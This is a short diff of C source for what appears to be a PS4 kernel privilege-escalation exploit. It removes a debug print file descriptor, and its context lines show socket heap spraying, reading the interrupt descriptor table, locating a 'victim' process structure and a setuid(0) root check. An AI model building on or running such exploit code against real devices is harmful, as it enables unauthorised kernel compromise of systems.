@@ -394,8 +394,6 @@ unsigned long long find_struct_proc(struct opaque* o, int victim, unsigned long 
 int jitshm_create(int flags, unsigned long long size, int prot);
 int jitshm_alias(int fd, int prot);
 
-extern int ps4_printf_fd;
-
 int main()
 {
     if(!setuid(0))
@@ -404,7 +402,6 @@ int main()
     int tmp;
 #define TAINTFD(x) do { tmp = x; not_close[tmp] = 1; } while(0)
 #define NEWSOCK(x) do { x = tmp = new_socket(); not_close[tmp] = 1; } while(0)
-    TAINTFD(ps4_printf_fd);
     unsigned long long idt_base;
     unsigned short idt_size;
     sidt(&idt_base, &idt_size);
@@ -437,7 +434,6 @@ int main()
     printf("overlap_idx = %d\n", overlap_idx);
     if(overlap_idx < 0)
         return 1;
-    ps4_printf_fd = -1;
     int overlap_sock = spray_sock[overlap_idx];
     int cleanup1 = overlap_sock;
     NEWSOCK(spray_sock[overlap_idx]);
